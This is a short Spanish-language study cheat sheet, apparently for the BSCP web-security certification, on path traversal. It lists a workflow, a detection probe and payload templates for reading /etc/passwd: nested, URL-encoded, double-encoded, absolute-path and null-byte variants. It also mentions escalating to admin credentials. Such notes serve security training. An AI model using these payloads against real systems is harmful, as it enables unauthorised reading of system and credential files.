---
tipo: cheatsheet
vuln: path-traversal
tags: [bscp, tipo/cheatsheet, vuln/path-traversal]
relacionada: "[[Path-Traversal]]"
---

# CS · Path Traversal

## Flujo repetible
1. Localiza {{PARAM}} que cargue un fichero.
2. Sube directorios; si hay filtro, codifica/anida.

## Detección
```
../../../etc/passwd               (sonda base: ¿aparece el contenido del fichero?)
```

## Plantillas de payload
```
../../../etc/passwd
....//....//etc/passwd            (anidado)
%2e%2e%2f%2e%2e%2fetc/passwd      (URL-encoded)
%252e%252e%252f...                (doble encoding)
/etc/passwd                       (ruta absoluta)
../../../etc/passwd%00.png        (null byte, legacy)
```

## Escalada al objetivo
Leer ficheros sensibles del sistema o {{SECRET_PATH}} → credenciales para escalar a admin.

## Checklist
- [ ] Probé traversal directo, codificado y anidado
- [ ] Probé ruta absoluta

## Referencias
- https://portswigger.net/web-security/file-path-traversal
